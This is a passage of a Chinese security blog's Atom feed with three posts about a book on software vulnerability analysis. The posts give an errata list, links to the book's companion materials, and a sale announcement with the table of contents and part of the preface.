      <category term="书籍" scheme="http://riusksk.github.io/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>《漏洞战争：软件漏洞分析精要》勘误表</title>
    <link href="http://riusksk.github.io/2016/07/17/%E3%80%8A%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81%E3%80%8B%E5%8B%98%E8%AF%AF%E8%A1%A8/"/>
    <id>http://riusksk.github.io/2016/07/17/《漏洞战争：软件漏洞分析精要》勘误表/</id>
    <published>2016-07-17T12:21:48.000Z</published>
    <updated>2016-07-17T12:29:56.000Z</updated>
    
    <content type="html">&lt;p&gt;后面会在github上维护一款《漏洞战争》的勘误表：&lt;a href=&quot;https://github.com/riusksk/vul_wars_error&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/riusksk/vul_wars_error&lt;/a&gt; ，会不定期更新，也欢迎各位读者通过微博&lt;a href=&quot;http://weibo.com/riusksk&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@riusksk&lt;/a&gt;反馈书中的错误，等后面重印时更正，并在前言添加感谢。&lt;/p&gt;
&lt;h3 id=&quot;当前错误列表&quot;&gt;&lt;a href=&quot;#当前错误列表&quot; class=&quot;headerlink&quot; title=&quot;当前错误列表&quot;&gt;&lt;/a&gt;当前错误列表&lt;/h3&gt;&lt;p&gt;1、前言VIII 第4段落最后一句：&lt;code&gt;专研&lt;/code&gt; =&amp;gt; &lt;code&gt;钻研&lt;/code&gt;&lt;br&gt;2、P7页中多处的 &lt;code&gt;smail&lt;/code&gt; =&amp;gt; &lt;code&gt;smali&lt;/code&gt;，&lt;code&gt;baksmail&lt;/code&gt; ＝&amp;gt; &lt;code&gt;baksmali&lt;/code&gt; （感谢 陈良@科恩实验室）&lt;br&gt;3、P529页第2段中，“按照&lt;code&gt;图10-12所示&lt;/code&gt;的方法重新编译内核源码” =&amp;gt; “按照&lt;code&gt;第10.3.7章节&lt;/code&gt;的方法重新编译内核源码”（感谢 江小照）&lt;br&gt;4、P16页最后一行中&lt;code&gt;Thread&lt;/code&gt; =&amp;gt; &lt;code&gt;Threat&lt;/code&gt;（感谢 “不高兴撒”）&lt;br&gt;5、P164页第3段第3行&lt;code&gt;unsigned int（2字节）&lt;/code&gt; =&amp;gt; &lt;code&gt;unsigned int（4字符）&lt;/code&gt;（感谢 “55-AA”）&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;后面会在github上维护一款《漏洞战争》的勘误表：&lt;a href=&quot;https://github.com/riusksk/vul_wars_error&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/riusksk/v
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="书籍" scheme="http://riusksk.github.io/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>《漏洞战争》配套资料下载</title>
    <link href="http://riusksk.github.io/2016/07/12/%E3%80%8A%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E3%80%8B%E9%85%8D%E5%A5%97%E8%B5%84%E6%96%99%E4%B8%8B%E8%BD%BD/"/>
    <id>http://riusksk.github.io/2016/07/12/《漏洞战争》配套资料下载/</id>
    <published>2016-07-12T09:20:48.000Z</published>
    <updated>2016-07-14T12:15:28.000Z</updated>
    
    <content type="html">&lt;p&gt;《漏洞战争》一书的配套资料，包括漏洞软件、样本、补丁对比的相关文件、学习资料等等。&lt;br&gt;由于多次上传目录失败，因此只好上传压缩包。&lt;/p&gt;
&lt;h3 id=&quot;下载地址：&quot;&gt;&lt;a href=&quot;#下载地址：&quot; class=&quot;headerlink&quot; title=&quot;下载地址：&quot;&gt;&lt;/a&gt;下载地址：&lt;/h3&gt;&lt;h4 id=&quot;1、GitHub下载&quot;&gt;&lt;a href=&quot;#1、GitHub下载&quot; class=&quot;headerlink&quot; title=&quot;1、GitHub下载&quot;&gt;&lt;/a&gt;1、&lt;a href=&quot;https://github.com/riusksk/vul_wars/raw/master/%E4%B9%A6%E7%B1%8D%E9%85%8D%E5%A5%97%E8%B5%84%E6%96%99.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub下载&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;2、百度云下载&quot;&gt;&lt;a href=&quot;#2、百度云下载&quot; class=&quot;headerlink&quot; title=&quot;2、百度云下载&quot;&gt;&lt;/a&gt;2、&lt;a href=&quot;http://pan.baidu.com/s/1pKBjEiB&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;百度云下载&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/media/vul_wars.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;《漏洞战争》一书的配套资料，包括漏洞软件、样本、补丁对比的相关文件、学习资料等等。&lt;br&gt;由于多次上传目录失败，因此只好上传压缩包。&lt;/p&gt;
&lt;h3 id=&quot;下载地址：&quot;&gt;&lt;a href=&quot;#下载地址：&quot; class=&quot;headerlink&quot; title=&quot;下载地址：&quot;&gt;&lt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="书籍" scheme="http://riusksk.github.io/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>《漏洞战争：软件漏洞分析精要》已开售</title>
    <link href="http://riusksk.github.io/2016/07/02/%E3%80%8A%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81%E3%80%8B%E5%B7%B2%E5%BC%80%E5%94%AE/"/>
    <id>http://riusksk.github.io/2016/07/02/《漏洞战争：软件漏洞分析精要》已开售/</id>
    <published>2016-07-02T03:08:34.000Z</published>
    <updated>2016-07-09T09:46:16.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;br&gt;&lt;/p&gt;
&lt;center&gt;&lt;img src=&quot;/media/book.png&quot; alt=&quot;&quot;&gt;&lt;/center&gt;

&lt;h3 id=&quot;购买地址&quot;&gt;&lt;a href=&quot;#购买地址&quot; class=&quot;headerlink&quot; title=&quot;购买地址　&quot;&gt;&lt;/a&gt;购买地址　&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://product.china-pub.com/4971073#qy&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;China-Pub&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://search.jd.com/Search?keyword=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;enc=utf-8&amp;amp;wq=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;pvid=3wfwj4qi.gk4kteggu1ql3#keyword=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89&amp;amp;enc=utf-8&amp;amp;qrst=1&amp;amp;rt=1&amp;amp;stop=1&amp;amp;vt=2&amp;amp;psort=2&amp;amp;click=2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;京东&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://world.taobao.com/search/search.htm?sort=price&amp;amp;_ksTS=1467426638963_384&amp;amp;spm=a21bp.7806943.20151106.1&amp;amp;search_type=0&amp;amp;json=on&amp;amp;cna=L%20rnC6dL4EYCATr7VsQhHYop&amp;amp;module=sortList&amp;amp;_input_charset=utf-8&amp;amp;navigator=all&amp;amp;s=0&amp;amp;q=%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%EF%BC%9A%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81&amp;amp;callback=__jsonp_cb&amp;amp;abtest=_AB-LR517-LR854-LR895-PR517-PR854-PV895_2462&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;淘宝&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://product.dangdang.com/1027799065.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;当当&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.amazon.cn/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B2%BE%E8%A6%81-%E6%9E%97%E6%A1%A0%E6%B3%89/dp/B01I2ZVN5U/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;亚马逊&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;编辑推荐&quot;&gt;&lt;a href=&quot;#编辑推荐&quot; class=&quot;headerlink&quot; title=&quot;编辑推荐　&quot;&gt;&lt;/a&gt;编辑推荐　&lt;/h3&gt;&lt;p&gt;《漏洞战争：软件漏洞分析精要》是这些年来难得一见的系统、全面深入分析漏洞攻防心要与战术的书籍。《漏洞战争：软件漏洞分析精要》结合经典的漏洞案例，从攻防思路、分析方法与实战等方面对漏洞攻防做了详细的阐述。既照顾了全局的视野，又不失细节上的周到，对于有志于安全事业并想在安全技术分析上有所提升的读者，这是一本可信赖的必备书籍。正如wushi老师所说：”……对照本书动手调试这些经典漏洞，我相信只要认真做一遍，功力会大增。”&lt;br&gt;还犹豫什么呢，好书，一本就够！&lt;/p&gt;
&lt;h3 id=&quot;内容简介&quot;&gt;&lt;a href=&quot;#内容简介&quot; class=&quot;headerlink&quot; title=&quot;内容简介&quot;&gt;&lt;/a&gt;内容简介&lt;/h3&gt;&lt;p&gt;《漏洞战争：软件漏洞分析精要》系统地讲解软件漏洞分析与利用所需的各类工具、理论技术和实战方法，主要涉及Windows 和Android 系统平台。《漏洞战争：软件漏洞分析精要》根据不同的软件漏洞类型划分，比如堆栈溢出、沙盒逃逸、类型混淆、UAF、内核漏洞等，同时又针对当前流行的移动安全，加入Android 平台上的漏洞分析与利用。以精心挑选的经典漏洞为例，以分享漏洞的分析技巧和工具为主，对这些漏洞的成因、利用及修复方法进行详细讲解，旨在”授之以渔”。《漏洞战争：软件漏洞分析精要》最大的特点是以各种类型的经典漏洞作为实战讲解，摒弃空头理论，几乎是”一本用调试器写出来的书”。&lt;br&gt;《漏洞战争：软件漏洞分析精要》适合计算机相关专业的本科及研究生，信息安全爱好者，软件安全及移动安全相关的安全从业人员，软件开发与测试人员、黑客等阅读。 &lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h3&gt;&lt;p&gt;第1 章 基础知识 1&lt;br&gt;11 漏洞的相关概念 1&lt;br&gt;111 什么是漏洞 1&lt;br&gt;112 漏洞的价值 1&lt;br&gt;113 0Day 漏洞 2&lt;br&gt;114 PoC 与Exploit 2&lt;br&gt;12 为什么要分析漏洞 2&lt;br&gt;13 常用分析工具 3&lt;br&gt;131 IDA-反汇编利器 3&lt;br&gt;132 OllyDbg-破解与逆向常用调试器 4&lt;br&gt;133 Immunity Debugger-漏洞分析专用调试器 4&lt;br&gt;134 WinDbg-微软正宗调试器 5&lt;br&gt;135 GDB-Linux 调试器 6&lt;br&gt;136 JEB-Android 反编译器 7&lt;br&gt;137 其他 8&lt;br&gt;14 常见的漏洞分析方法 8&lt;br&gt;141 静态分析 8&lt;br&gt;142 动态调试 9&lt;br&gt;143 源码分析 9&lt;br&gt;144 补丁比较 9&lt;br&gt;145 污点追踪 10&lt;br&gt;15 学习资源 11&lt;br&gt;151 站点分享 11&lt;br&gt;152 书籍推荐 12&lt;br&gt;16 本章总结 13&lt;br&gt;第2 章 栈溢出漏洞分析 14&lt;br&gt;21 栈溢出简史 14&lt;br&gt;22 栈溢出原理 15&lt;br&gt;23 CVE-2010-2883 Adobe Reader TTF 字体SING 表栈溢出漏洞 16&lt;br&gt;231 LuckyCat 攻击事件 16&lt;br&gt;232 漏洞描述 18&lt;br&gt;233 分析环境 18&lt;br&gt;234 基于字符串定位的漏洞分析方法 19&lt;br&gt;235 样本Exploit 技术分析 20&lt;br&gt;236 样本Shellcode 恶意行为分析 26&lt;br&gt;237 漏洞修复 29&lt;br&gt;24 CVE-2010-3333 Microsoft RTF 栈溢出漏洞 30&lt;br&gt;241 林来疯攻击事件 30&lt;br&gt;242 漏洞描述 31&lt;br&gt;243 分析环境 31&lt;br&gt;244 RTF 文件格式 32&lt;br&gt;245 基于栈回溯的漏洞分析方法 33&lt;br&gt;246 漏洞利用 41&lt;br&gt;247 Office 2003 与Office 2007 Exploit 通用性研究 42&lt;br&gt;248 漏洞修复 45&lt;br&gt;25 CVE-2011-0104 Microsoft Excel TOOLBARDEF Record 栈溢出漏洞 51&lt;br&gt;251 漏洞描述 51&lt;br&gt;252 分析环境 52&lt;br&gt;253 基于污点追踪思路的漏洞分析方法 52&lt;br&gt;254 漏洞修复 59&lt;br&gt;26 阿里旺旺ActiveX 控件imageMandll 栈溢出漏洞 60&lt;br&gt;261 漏洞描述 60&lt;br&gt;262 分析环境 60&lt;br&gt;263 针对ActiveX 控件的漏洞分析方法 60&lt;br&gt;264 漏洞利用 63&lt;br&gt;27 CVE-2012-0158 Microsoft Office MSCOMCTLocx 栈溢出漏洞 65&lt;br&gt;271 Lotus Blossom 行动 65&lt;br&gt;272 漏洞描述 65&lt;br&gt;273 分析环境 65&lt;br&gt;274 基于OffVis 工具的Office 漏洞分析方法 66&lt;br&gt;275 漏洞修复 71&lt;br&gt;28 总结 72&lt;br&gt;第3 章 堆溢出漏洞分析 73&lt;br&gt;31 堆溢出简史 73&lt;br&gt;32 堆溢出原理 74&lt;br&gt;33 堆调试技巧 79&lt;br&gt;331 堆尾检查 80&lt;br&gt;332 页堆 81&lt;br&gt;34 CVE-2010-2553 Microsoft Cinepak Codec CVDecompress 函数堆溢出漏洞 85&lt;br&gt;341 漏洞描述 85&lt;br&gt;342 分析环境 85&lt;br&gt;343 基于HeapPage 的堆漏洞分析方法 85&lt;br&gt;344 漏洞修复 101&lt;br&gt;35 CVE-2012-0003 Microsoft Windows Media Player winmmdll MIDI 文件堆溢出漏洞 104&lt;br&gt;351 关于”蜘蛛”漏洞攻击包（Zhi-Zhu Exploit Pack） 104&lt;br&gt;352 漏洞描述 105&lt;br&gt;353 分析环境 105&lt;br&gt;354 MIDI 文件格式 105&lt;br&gt;355 基于导图推算的漏洞分析方法 107&lt;br&gt;356 漏洞利用 122&lt;br&gt;357 补丁比较 130&lt;br&gt;36 CVE-2013-0077 Microsoft DirectShow quartzdll m2p 文件堆溢出漏洞 130&lt;br&gt;361 漏洞描述 130&lt;br&gt;362 基于HTC 的漏洞分析方法 131&lt;br&gt;363 漏洞修复 134&lt;br&gt;37 CVE-2012-1876 Internet Exporter MSHTMLdll CalculateMinMax 堆溢出漏洞 135&lt;br&gt;371 在Pwn2Own 黑客大赛上用于攻破IE9 的漏洞 135&lt;br&gt;372 分析环境 135&lt;br&gt;373 基于HPA 的漏洞分析方法 135&lt;br&gt;374 通过信息泄露实现漏洞利用 149&lt;br&gt;375 漏洞修复 161&lt;br&gt;38 小结 163&lt;br&gt;第4 章 整数溢出漏洞分析 164&lt;br&gt;41 整数溢出简史 164&lt;br&gt;42 整数溢出原理 164&lt;br&gt;421 基于栈的整数溢出 165&lt;br&gt;422 基于堆的整数溢出 166&lt;br&gt;43 CVE-2011-0027 Microsoft Data Access Components 整数溢出漏洞 167&lt;br&gt;431 在Pwn2Own 黑客大赛上用于攻破IE8 的漏洞 167&lt;br&gt;432 基于堆分配记录的漏洞分析方法 168&lt;br&gt;433 补丁比较 176&lt;br&gt;44 CVE-2012-0774 Adobe Reader TrueType 字体整数溢出漏洞 178&lt;br&gt;441 漏洞描述 178&lt;br&gt;442 PDF 文件格式与常用分析工具 178&lt;br&gt;443 基于条件记录断点的漏洞分析方法 182&lt;br&gt;444 补丁分析 196&lt;br&gt;45 CVE-2013-0750 Firefox 字符串替换整数溢出漏洞 197&lt;br&gt;451 漏洞描述 197&lt;br&gt;452 基于源码调试的漏洞分析方法 197&lt;br&gt;453 源码比对 207&lt;br&gt;46 CVE-2013-2551 Internet Explorer VML COALineDashStyleArray 整数溢出漏洞 208&lt;br&gt;461 在Pwn2Own 黑客大赛上攻破IE10 的漏洞 208&lt;br&gt;462 基于类函数定位的漏洞分析方法 208&lt;br&gt;463 利用信息泄露实现漏洞利用 223&lt;br&gt;47 总结 226&lt;br&gt;第5 章 格式化字符串漏洞分析 227&lt;br&gt;51 格式化字符串漏洞简史 227&lt;br&gt;52 格式化字符串漏洞的原理 227&lt;br&gt;53 CVE-2012-0809 Sudo sudo_debug 函数格式化字符串漏洞 234&lt;br&gt;531 漏洞描述 234&lt;br&gt;532 通过源码比对分析漏洞 234&lt;br&gt;54 CVE-2012-3569 VMware OVF Tool 格式化字符串漏洞 235&lt;br&gt;541 漏洞描述 235&lt;br&gt;542 基于输出消息的漏洞定位方法 235&lt;br&gt;543 漏洞利用 239&lt;br&gt;55 总结 242&lt;br&gt;第6 章 双重释放漏洞分析 243&lt;br&gt;61 双重释放漏洞简史 243&lt;br&gt;62 双重释放漏洞的原理 243&lt;br&gt;63 CVE-2010-3974 Windows 传真封面编辑器fxscoverexe 双重释放漏洞 246&lt;br&gt;631 漏洞描述 246&lt;br&gt;632 通过栈回溯和堆状态判定漏洞类型 246&lt;br&gt;633 通过补丁比较确定漏洞成因及修复方法 249&lt;br&gt;64 CVE-2014-0502 Adobe Flash Player 双重释放漏洞 251&lt;br&gt;641 GreedyWonk 行动 251&lt;br&gt;642 静态分析攻击样本 251&lt;br&gt;643 Shellcode 自动化模拟执行 263&lt;br&gt;644 基于ROP 指令地址的反向追踪 265&lt;br&gt;65 总结 273&lt;br&gt;第7 章 释放重引用漏洞分析 274&lt;br&gt;71 释放重引用（Use After Free，UAF）漏洞简史 274&lt;br&gt;72 UAF 漏洞的原理 274&lt;br&gt;73 CVE-2011-0065 Firefox mChannel UAF 漏洞 277&lt;br&gt;731 漏洞描述 277&lt;br&gt;732 通过动态调试快速定位漏洞源码 277&lt;br&gt;733 漏洞利用 285&lt;br&gt;734 源码比对 286&lt;br&gt;74 CVE-2013-1347 Microsoft IE CGenericElement UAF 漏洞 287&lt;br&gt;741 “水坑”攻击事件 287&lt;br&gt;742 通过HPA 快速定位漏洞对象 287&lt;br&gt;743 逆向分析IE 引擎对JavaScript 代码的解析 290&lt;br&gt;744 追本溯源：探寻漏洞的本质 321&lt;br&gt;745 漏洞利用 324&lt;br&gt;75 CVE-2013-3346 Adobe Reader ToolButton UAF 漏洞 326&lt;br&gt;751 “Epic Turla”网络间谍攻击行动 326&lt;br&gt;752 使用peepdf 分析PDF 恶意样本 326&lt;br&gt;753 漏洞利用 338&lt;br&gt;76 CVE-2015-0313 Adobe Flash Player Workers ByteArray UAF 漏洞 340&lt;br&gt;761 漏洞描述 340&lt;br&gt;762 分析ActiveScript 虚拟机源码辅助漏洞调试 340&lt;br&gt;763 Flash JIT 调试插件与符号文件 353&lt;br&gt;764 漏洞利用 354&lt;br&gt;765 漏洞修复 360&lt;br&gt;77 本章总结 360&lt;br&gt;第8 章 数组越界访问漏洞分析 361&lt;br&gt;81 数组越界与溢出的关系 361&lt;br&gt;82 数组越界访问漏洞原理 361&lt;br&gt;83 CVE-2011-2110 Adobe Flash Player 数组越界访问漏洞 363&lt;br&gt;831 漏洞描述 363&lt;br&gt;832 解决安装旧版Flash Player 的限制问题 364&lt;br&gt;833 通过Perl 脚本辅助分析样本 365&lt;br&gt;834 搭建服务器重现漏洞场景 371&lt;br&gt;835 通过修改样本代码定位漏洞 373&lt;br&gt;836 通过构造信息泄露利用漏洞 376&lt;br&gt;837 通过搜索指令序列分析补丁 380&lt;br&gt;84 CVE-2014-0160 OpenSSL TLS 数组越界访问漏洞（”心脏出血”） 382&lt;br&gt;841 漏洞描述 382&lt;br&gt;842 基于源码对比与跟踪的漏洞分析方法 383&lt;br&gt;843 利用漏洞盗取网站账号 389&lt;br&gt;85 本章总结 394&lt;br&gt;第9 章 内核漏洞分析 395&lt;br&gt;91 Windows 内核漏洞漫谈 395&lt;br&gt;92 Windows 内核调试环境搭建 396&lt;br&gt;93 常见内核漏洞原理与利用 398&lt;br&gt;931 漏洞成因分析 398&lt;br&gt;932 漏洞利用 405&lt;br&gt;94 360 安全卫士bregdrvsys 本地提权漏洞分析 414&lt;br&gt;941 漏洞描述 414&lt;br&gt;942 基于导出函数和IO 控制码的追踪分析 414&lt;br&gt;95 CVE-2011-2005 Windows Afdsys 本地提权漏洞 423&lt;br&gt;951 漏洞描述 423&lt;br&gt;952 从利用代码到漏洞函数的定位分析 423&lt;br&gt;953 补丁比较 426&lt;br&gt;96 CVE-2013-3660 Windows win32ksys EPATHOB 指针未初始化漏洞 426&lt;br&gt;961 漏洞描述 426&lt;br&gt;962 通过IDA 定义结构体辅助分析 427&lt;br&gt;963 漏洞利用 431&lt;br&gt;97 CVE-2014-1767 Windows AFDsys 双重释放漏洞（Pwn2Own 2014） 437&lt;br&gt;971 Pwnie Awards 2014”最佳提权漏洞奖”得主 437&lt;br&gt;972 基于IOCTL 处理函数自动追踪记录的分析方法 437&lt;br&gt;973 漏洞利用 454&lt;br&gt;974 补丁分析 460&lt;br&gt;98 本章总结 462&lt;br&gt;第10 章 Android 平台漏洞分析 463&lt;br&gt;101 Android 平台漏洞简史 463&lt;br&gt;102 Android 平台漏洞分类 466&lt;br&gt;103 常见的漏洞分析方法 467&lt;br&gt;1031 APK 静态分析 467&lt;br&gt;1032 smali 动态调试 468&lt;br&gt;1033 so 库动态调试 474&lt;br&gt;1034 补丁源码比对 475&lt;br&gt;1035 系统Java 源码调试 477&lt;br&gt;1036 系统C/C++源码调试 486&lt;br&gt;1037 Android 内核源码调试 488&lt;br&gt;104 智能插座漏洞分析 492&lt;br&gt;1041 漏洞描述 492&lt;br&gt;1042 静态逆向分析 492&lt;br&gt;1043 利用漏洞控制网络上的任意插座 497&lt;br&gt;1044 总结 502&lt;br&gt;105 CVE-2013-4787 Android 系统签名漏洞 502&lt;br&gt;1051 漏洞描述 502&lt;br&gt;1052 Android 签名机制 503&lt;br&gt;1053 漏洞重现 509&lt;br&gt;1054 漏洞原理分析 514&lt;br&gt;1055 漏洞修复 516&lt;br&gt;106 CVE-2010-1119 Android WebKit UAF 漏洞 516&lt;br&gt;1061 漏洞描述 516&lt;br&gt;1062 漏洞利用 517&lt;br&gt;1063 通过补丁源码分析漏洞成因 524&lt;br&gt;107 CVE-2014-3153 Android 内核Futex 提权漏洞（Towelroot） 528&lt;br&gt;1071 Android 设备Root 神器-Towelroot 528&lt;br&gt;1072 通过内核源码调试分析漏洞 528&lt;br&gt;1073 漏洞利用 548&lt;br&gt;1074 漏洞修复 554&lt;br&gt;108 本章总结 554&lt;br&gt;第11 章 其他类型的漏洞分析 555&lt;br&gt;111 本章引言 555&lt;br&gt;112 CVE-2013-2423 JAVA Applet reflection 类型混淆代码执行漏洞 555&lt;br&gt;1121 漏洞描述 555&lt;br&gt;1122 类型混淆漏洞 555&lt;br&gt;1123 Java 安全机制 556&lt;br&gt;1124 漏洞分析与利用 558&lt;br&gt;1125 漏洞修复 562&lt;br&gt;1126 2013 年漏洞之王-Java 563&lt;br&gt;113 CVE-2014-0257 Microsoft Internet Explorer 11 dfsvc 组件沙盒逃逸漏洞 564&lt;br&gt;1131 漏洞描述 564&lt;br&gt;1132 IE 沙盒保护原理 564&lt;br&gt;1133 IE 沙盒攻击面分析 569&lt;br&gt;1134 CVE-2014-0257 漏洞分析与利用 570&lt;br&gt;114 CVE-2014-9150 Adobe Acrobat Reader MoveFileEx IPC Hook 竞争条件&lt;br&gt;（沙盒逃逸）漏洞 572&lt;br&gt;1141 Therac-25 医疗事故 572&lt;br&gt;1142 竞争条件漏洞原理 573&lt;br&gt;1143 CVE-2014-9150 漏洞描述 574&lt;br&gt;1144 Adobe 沙盒简介 574&lt;br&gt;1145 利用漏洞实现沙盒逃逸 575&lt;br&gt;115 本章总结 578&lt;br&gt;第12 章 软件漏洞发展趋势 579&lt;br&gt;121 软件漏洞领域的新挑战 579&lt;br&gt;122 移动终端漏洞发展趋势 579&lt;br&gt;123 云计算平台漏洞发展趋势 581&lt;br&gt;124 物联网漏洞发展趋势 583&lt;br&gt;125 本章总结 585 &lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言　　&quot;&gt;&lt;/a&gt;前言　　&lt;/h3&gt;&lt;h4 id=&quot;为什么写这本书&quot;&gt;&lt;a href=&quot;#为什么写这本书&quot; class=&quot;headerlink&quot; title=&quot;为什么写这本书&quot;&gt;&lt;/a&gt;为什么写这本书&lt;/h4&gt;&lt;p&gt;　　不知道大家是否曾有过这样的经历：&lt;br&gt;　　&lt;br&gt;　　● 无法读懂网上很多软件漏洞分析文章，不理解里面的漏洞成因和漏洞利用技巧。&lt;br&gt;　　● 即使读懂某篇软件漏洞分析文章，自己仍无法独立完成相同漏洞的分析。如果文章中所使用的&lt;br&gt;　　测试环境与软件版本跟自己使用的不一样，则顿时更不知如何入手。&lt;br&gt;　　● 很多软件漏洞分析文章贴出存在漏洞的汇编代码，指出导致漏洞的原因，即”结论式分析”，但如何定位到此段代码并无解释，看完之后，仍不知如何快速定位，缺乏可借鉴的思路。&lt;br&gt;　　&lt;br&gt;　　带着这些问题，相信读者会在本书中找到想要的答案。&lt;br&gt;　　&lt;br&gt;　　再来聊下本书的一些写作经历，开始写作本书始于2012年5月，最初是”爱无言”找到我，说大家合作写一本关于软件漏洞案例分析的书，因为那段时间我在博客上每周都会分享一两篇软件漏洞分析的实际案例，而当时国内还没有专门写软件漏洞案例的专著（几年前出版的《0Day安全：软件漏洞分析技术》主要偏向堆和栈溢出及内核方面的漏洞分析，实际案例较少，且”爱无言”也是作者之一）。&lt;br&gt;　　就这样，两人开始谋划，写书的念头就此产生。&lt;br&gt;　　后来，我又拉了两位朋友加入，然后几人列出大纲目录，但最后因为种种原因，只剩下我一人独自完成本书创作，中途也多次想放弃，但庆幸的是，历时3年半，终于2015年12月完稿，共历时4年后出版。&lt;br&gt;　　就这样，一本原为”合著”的书就写成了”专著”。&lt;br&gt;　　由于朋友的退出，以及写作速度较慢，中途停写半年，已原本打算放弃。后来，有一天，编辑”皎子”找我聊了一些出书的想法。&lt;br&gt;　　就这样，一本原打算沉留箱底的”残卷”再次被”激活”。&lt;br&gt;　　之后的写书经历还算顺利，又历时一年左右完稿，比较符合预期，遗留心底多年的梗总算可以释怀了。&lt;br&gt;　　相信一些读者看完本书目录之后会有一些疑问，也相信其中一些疑问也是我在定位本书方向时考虑的，所以有必要在此谈一谈。&lt;/p&gt;
&lt;h4 id=&quot;Q：本书与《0day-安全：软件漏洞分析技术》有何区别？&quot;&gt;&lt;a href=&quot;#Q：本书与《0day-安全：软件漏洞分析技术》有何区别？&quot; class=&quot;headerlink&quot; title=&quot;Q：本书与《0day 安全：软件漏洞分析技术》有何区别？&quot;&gt;&lt;/a&gt;Q：本书与《0day 安全：软件漏洞分析技术》有何区别？&lt;/h4&gt;&lt;p&gt;A：0day安全一书主要是讲Windows平台下堆栈溢出和内核提权的漏洞分析技术，还涉及部分格式化字符串漏洞，从基础讲起，最后是实例分析。本书则完全是以真实的漏洞为实例以分享漏洞分析时的一些技巧，以漏洞类型的不同来分享不同的漏洞分析技巧，可以说是”用调试器写出来的一本书”，而且综合考虑当前热门的移动安全，特意加入Android平台上的漏洞分析章节，从Java层、Native层和内核层等方向分享不同的调试分析方法。从难度而言，本书比《0day安全：软件漏洞分析技术》一书更难，可以将本书当作进阶版，搭配学习。&lt;/p&gt;
&lt;h4 id=&quot;Q：本书列举的许多漏洞实例网上早有分析文章，为何还写这本书？&quot;&gt;&lt;a href=&quot;#Q：本书列举的许多漏洞实例网上早有分析文章，为何还写这本书？&quot; class=&quot;headerlink&quot; title=&quot;Q：本书列举的许多漏洞实例网上早有分析文章，为何还写这本书？&quot;&gt;&lt;/a&gt;Q：本书列举的许多漏洞实例网上早有分析文章，为何还写这本书？&lt;/h4&gt;&lt;p&gt;A：著书的宗旨在于”授人以鱼，不如授人以渔”。如果读者经常看网上的漏洞分析文章，就会发现一个常见现象：它们大多是”结论性分析”，而非”思路性分析”。换句话说，就是贴出存在漏洞的汇编代码，然后直接给出漏洞成因的结论，至于如何定位到漏洞代码，并没有给出分析思路。正因为如此，即使你看懂了Vupen漏洞军火商写的分析文章，也不代表你看完后就能独立分析出来，甚至在调试之后，你还会发现Vupen在一些文章里留有”坑”，故意省略或写错某些关键内容，如果没有自己实际调试一遍是很难发现这些问题的。&lt;br&gt;　　相信有一定软件漏洞分析经验的朋友会注意到，软件漏洞分析的大部分时间是花费在寻找和定位漏洞代码，而非分析存在漏洞的代码。对于有一定编程经验和漏洞基础的读者，如果直接给一段漏洞代码，可能很容易就看出来，但像Adobe和Windows这些复杂的软件或系统，在千千万万的代码行中找到漏洞代码是有一定难度的。因此，本书的重点是讲授如何快速地定位漏洞代码，针对不同漏洞类型采取不同的分析技巧，以帮助大家快速地分析出漏洞成因，制定检测、防御与修复方案。书中的漏洞实例分析技巧是可以长期运用和延伸的，这才是本书的核心价值。&lt;/p&gt;
